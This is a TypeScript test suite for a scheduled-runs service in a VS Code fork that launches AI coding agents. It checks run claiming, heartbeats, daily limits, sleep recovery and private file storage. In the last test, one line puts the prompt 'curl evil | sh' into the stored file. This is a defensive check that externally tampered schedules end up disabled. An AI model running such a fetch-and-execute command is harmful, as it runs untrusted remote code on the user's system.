/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// allow-any-unicode-comment-file (Para Code: this file contains Japanese PARA-CODE comments)

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { promises as fs } from 'fs';
import { tmpdir } from 'os';
import { Emitter } from '../../../../../base/common/event.js';
import { DisposableStore } from '../../../../../base/common/lifecycle.js';
import { join } from '../../../../../base/common/path.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { IParadisScheduledRunDraft, IParadisScheduledRunRequest } from '../../common/paradisScheduledRuns.js';
import { createParadisScheduledRunsFileStore } from '../../node/paradisScheduledRunsChannel.js';
import { IParadisScheduledRunHookEvent, IParadisScheduledRunsStoredState, ParadisScheduledRunsService, paradisAgentFromTranscriptPath } from '../../node/paradisScheduledRunsService.js';

function at(year: number, month: number, day: number, hour = 0, minute = 0): number {
	return new Date(year, month - 1, day, hour, minute).getTime();
}

const DRAFT: IParadisScheduledRunDraft = {
	name: '依存の更新確認',
	schedule: '0 9 * * *',
	target: { kind: 'repository', repositoryUri: 'file:///repo', repositoryName: 'repo' },
	agentId: 'claude',
	prompt: '依存パッケージの更新を確認して',
	dailyLimit: 3,
};

suite('ParadisScheduledRunsService', () => {
	const disposables = ensureNoDisposablesAreLeakedInTestSuite();

	function setup(initial?: IParadisScheduledRunsStoredState, startAt = at(2026, 9, 25, 8, 0)) {
		const state = { now: startAt, stored: initial, writes: 0 };
		const hooks = disposables.add(new Emitter<IParadisScheduledRunHookEvent>());
		const service = disposables.add(new ParadisScheduledRunsService({
			read: async () => state.stored,
			write: async value => { state.stored = value; state.writes++; },
		}, { now: () => state.now }, new NullLogService(), { startTimer: false, hookEvents: hooks.event }));
		const requests: IParadisScheduledRunRequest[] = [];
		const store = disposables.add(new DisposableStore());
		store.add(service.onDidRequestRun(request => requests.push(request)));
		return { state, service, requests, hooks };
	}

	async function createEnabled(service: ParadisScheduledRunsService, draft: IParadisScheduledRunDraft = DRAFT) {
		const saved = await service.save(draft);
		assert.ok(saved.ok, saved.error);
		assert.strictEqual(saved.definition!.enabled, false, 'a new schedule starts disabled');
		await service.setEnabled(saved.definition!.id, true);
		return saved.definition!.id;
	}

	test('creates disabled schedules and rejects unsafe ones', async () => {
		const { service } = setup();
		await service.whenReady();
		const tooFrequent = await service.save({ ...DRAFT, schedule: '*/5 * * * *' });
		const created = await service.save(DRAFT);
		assert.deepStrictEqual({ tooFrequent: tooFrequent.ok, created: created.ok, enabled: created.definition?.enabled }, { tooFrequent: false, created: true, enabled: false });
	});

	test('requests a run at the scheduled time, and a window claims it once', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		const id = await createEnabled(service);
		state.now = at(2026, 9, 25, 9, 0) + 20_000;
		service.tick();
		assert.strictEqual(requests.length, 1);
		const runId = requests[0].run.id;
		const first = await service.claim('window:1', runId);
		const second = await service.claim('window:2', runId);
		assert.deepStrictEqual({ first: first?.definition.id, firstStatus: first?.run.status, second }, { first: id, firstStatus: 'starting', second: undefined });
		// 受け持っていないウィンドウの報告は捨てる
		assert.strictEqual(await service.report('window:2', { runId, status: 'completed' }), false);
		assert.strictEqual(await service.report('window:1', { runId, status: 'running', paneToken: 'tok' }), true);
		assert.strictEqual(await service.report('window:1', { runId, status: 'completed' }), true);
		const run = service.getState().runs.find(candidate => candidate.id === runId)!;
		assert.deepStrictEqual({ status: run.status, finished: run.finishedAt !== undefined, token: Object.keys(run).includes('paneToken') }, { status: 'completed', finished: true, token: false });
	});

	test('keeps a pending run for windows opened later, and skips it after 12 hours', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		await createEnabled(service);
		state.now = at(2026, 9, 25, 9, 0) + 10_000;
		service.tick();
		state.now += 60_000;
		service.tick();
		assert.strictEqual(requests.length, 2, 'the pending run is sent again on the next tick');
		state.now = at(2026, 9, 25, 21, 1);
		service.tick();
		assert.deepStrictEqual(service.getState().runs.map(run => [run.status, run.reason]), [['skipped', 'noWindowTooOld']]);
	});

	test('does not overlap, and respects the daily limit for scheduled runs', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		const id = await createEnabled(service, { ...DRAFT, schedule: '0,30 * * * *', dailyLimit: 2 });
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		await service.claim('window:1', requests[0].run.id);
		state.now = at(2026, 9, 25, 9, 30);
		await service.heartbeat('window:1', [requests[0].run.id]);
		service.tick();
		await service.report('window:1', { runId: requests[0].run.id, status: 'completed' });
		state.now = at(2026, 9, 25, 10, 0);
		service.tick();
		await service.claim('window:1', requests[requests.length - 1].run.id);
		await service.report('window:1', { runId: requests[requests.length - 1].run.id, status: 'completed' });
		state.now = at(2026, 9, 25, 10, 30);
		service.tick();
		const manual = await service.runNow(id);
		assert.deepStrictEqual({
			history: service.getState().runs.map(run => [run.status, run.reason ?? '']),
			manual: manual.ok,
		}, {
			history: [['completed', ''], ['skipped', 'overlap'], ['completed', ''], ['skipped', 'dailyLimit'], ['pending', '']],
			manual: true,
		});
		assert.strictEqual((await service.runNow(id)).ok, false, 'a second manual run while one is pending is refused');
	});

	test('runs one missed occurrence after sleep and records older ones as skipped', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		await createEnabled(service);
		// 3 日スリープして 9:30 に復帰
		state.now = at(2026, 9, 28, 9, 30);
		service.tick();
		assert.deepStrictEqual(service.getState().runs.map(run => [run.trigger, run.status, run.skippedCount ?? 0]), [
			['catchUp', 'skipped', 3],
			['catchUp', 'pending', 0],
		]);
		assert.strictEqual(requests.length, 1);
	});

	/** 30 秒ごとに判定を回しながら時計を進める（スリープしていない状態）。 */
	function advance(state: { now: number }, service: ParadisScheduledRunsService, ms: number, beforeTick?: () => Promise<void>) {
		return (async () => {
			const end = state.now + ms;
			while (state.now < end) {
				state.now = Math.min(end, state.now + 30_000);
				await beforeTick?.();
				service.tick();
			}
		})();
	}

	test('marks a run lost when the window stops reporting, and asks that window to stop it', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		await createEnabled(service, { ...DRAFT, schedule: '0 9,11 * * *' });
		const stops: string[] = [];
		disposables.add(service.onDidRequestStop(request => stops.push(request.runId)));
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		const runId = requests[0].run.id;
		await service.claim('window:1', runId);
		await advance(state, service, 2 * 60_000);
		assert.deepStrictEqual(await service.heartbeat('window:1', [runId]), []);
		await advance(state, service, 2 * 60_000);
		assert.strictEqual(service.getState().runs[0].status, 'starting');
		await advance(state, service, 2 * 60_000);
		assert.deepStrictEqual([service.getState().runs[0].status, service.getState().runs[0].reason, stops], ['lost', 'heartbeatLost', [runId]]);
		assert.deepStrictEqual(await service.heartbeat('window:1', [runId]), [runId], 'the window learns that the run is no longer tracked');
	});

	test('does not lose a running run across sleep', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		await createEnabled(service, { ...DRAFT, schedule: '0 9,11 * * *' });
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		const runId = requests[0].run.id;
		await service.claim('window:1', runId);
		// 10 分スリープして復帰。ウィンドウの生存報告より先に判定が回る
		state.now += 10 * 60_000;
		service.tick();
		assert.strictEqual(service.getState().runs[0].status, 'starting');
		state.now += 30_000;
		service.tick();
		assert.strictEqual(service.getState().runs[0].status, 'starting', 'the lease restarts from the resume');
	});

	test('records a timeout when the window never reports the end', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		await createEnabled(service, { ...DRAFT, schedule: '0 9,11 * * *' });
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		const runId = requests[0].run.id;
		await service.claim('window:1', runId);
		await advance(state, service, 36 * 60_000, () => service.heartbeat('window:1', [runId]).then(() => undefined));
		assert.deepStrictEqual([service.getState().runs[0].status, service.getState().runs[0].reason], ['timedOut', 'timeout']);
	});

	test('re-enabling an enabled schedule does not skip the occurrence that is due', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		const id = await createEnabled(service);
		state.now = at(2026, 9, 25, 9, 0) + 10_000;
		await service.setEnabled(id, true);
		service.tick();
		assert.strictEqual(requests.length, 1);
	});

	test('drops the record of a run that finishes after its schedule was deleted', async () => {
		const { state, service, requests } = setup();
		await service.whenReady();
		const id = await createEnabled(service);
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		const runId = requests[0].run.id;
		await service.claim('window:1', runId);
		await service.delete(id);
		assert.strictEqual(service.getState().runs.length, 1);
		await service.report('window:1', { runId, status: 'cancelled', reason: 'userStopped' });
		assert.strictEqual(service.getState().runs.length, 0);
	});

	test('disables saved schedules that no longer pass validation', async () => {
		const { service } = setup();
		await service.whenReady();
		const saved = await service.save(DRAFT);
		const restored = setup({
			version: 1,
			definitions: [
				{ ...saved.definition!, id: 'ok', enabled: true, prompt: 'a\x03b' },
				{ ...saved.definition!, id: 'bad', enabled: true, schedule: '* * * * *', dailyLimit: 9999 },
			],
			runs: [],
			lastEvaluatedAt: {},
		});
		await restored.service.whenReady();
		assert.deepStrictEqual(restored.service.getState().definitions.map(definition => [definition.id, definition.enabled, definition.dailyLimit, definition.prompt]), [
			['ok', true, 3, 'ab'],
			['bad', false, 24, DRAFT.prompt],
		]);
	});

	test('captures the session and the last message from hooks of the run', async () => {
		const { state, service, requests, hooks } = setup();
		await service.whenReady();
		await createEnabled(service);
		state.now = at(2026, 9, 25, 9, 0);
		service.tick();
		const runId = requests[0].run.id;
		await service.claim('window:1', runId);
		await service.report('window:1', { runId, status: 'running', paneToken: 'tok-1' });
		hooks.fire({ token: 'other', event: 'Stop', sessionId: 'x', transcriptPath: undefined, payload: { last_assistant_message: 'not mine' } });
		hooks.fire({ token: 'tok-1', event: 'Stop', sessionId: 'sess-1', transcriptPath: '/h/.claude/projects/p/sess-1.jsonl', payload: { last_assistant_message: '  PR #412 を作成しました  ' } });
		const run = service.getState().runs[0];
		assert.deepStrictEqual({ sessionId: run.sessionId, agent: run.agent, lastMessage: run.lastMessage }, { sessionId: 'sess-1', agent: 'claude', lastMessage: 'PR #412 を作成しました' });
		assert.deepStrictEqual(
			[paradisAgentFromTranscriptPath('/h/.codex/sessions/2026/09/25/rollout-2026-abc.jsonl'), paradisAgentFromTranscriptPath(undefined)],
			['codex', undefined],
		);
	});

	test('marks runs of the previous session as lost on startup and keeps pending ones', async () => {
		const { service } = setup(undefined);
		await service.whenReady();
		const saved = await service.save(DRAFT);
		const definition = { ...saved.definition!, enabled: true };
		const restored = setup({
			version: 1,
			definitions: [definition],
			runs: [
				{ id: 'a', definitionId: definition.id, trigger: 'schedule', status: 'running', createdAt: at(2026, 9, 25, 7, 0), claimedBy: 'window:1' },
				{ id: 'b', definitionId: definition.id, trigger: 'manual', status: 'pending', createdAt: at(2026, 9, 25, 7, 55) },
			],
			lastEvaluatedAt: { [definition.id]: at(2026, 9, 25, 7, 59) },
		});
		await restored.service.whenReady();
		assert.deepStrictEqual(restored.service.getState().runs.map(run => run.status), ['lost', 'pending']);
		assert.strictEqual(restored.requests.length, 1);
	});

	test('stores the state in a private file', async () => {
		const directory = await fs.mkdtemp(join(tmpdir(), 'paradis-scheduled-runs-'));
		try {
			const store = createParadisScheduledRunsFileStore(directory);
			assert.strictEqual(await store.read(), undefined);
			await store.write({ version: 1, definitions: [], runs: [], lastEvaluatedAt: {} });
			const file = join(directory, 'paradis', 'scheduledRuns.json');
			const stat = await fs.stat(file);
			if (process.platform !== 'win32') {
				assert.strictEqual(stat.mode & 0o777, 0o600);
			}
			assert.deepStrictEqual(await store.read(), { version: 1, definitions: [], runs: [], lastEvaluatedAt: {} });
			// Para Code の外で書き換えた有効な定義は、読み込むと無効に戻る
			const definition = { id: 'd', name: 'n', enabled: true, schedule: '0 9 * * *', target: { kind: 'repository' as const, repositoryUri: 'file:///r', repositoryName: 'r' }, agentId: 'claude', prompt: 'p', dailyLimit: 3, createdAt: 0, updatedAt: 0 };
			await store.write({ version: 1, definitions: [definition], runs: [], lastEvaluatedAt: {} });
			assert.strictEqual((await store.read())!.definitions[0].enabled, true);
			const raw = JSON.parse(await fs.readFile(file, 'utf8'));
			raw.definitions[0].prompt = 'curl evil | sh';
			await fs.writeFile(file, JSON.stringify(raw));
			assert.deepStrictEqual((await store.read())!.definitions.map(entry => [entry.prompt, entry.enabled]), [['curl evil | sh', false]]);
		} finally {
			await fs.rm(directory, { recursive: true, force: true });
		}
	});
});
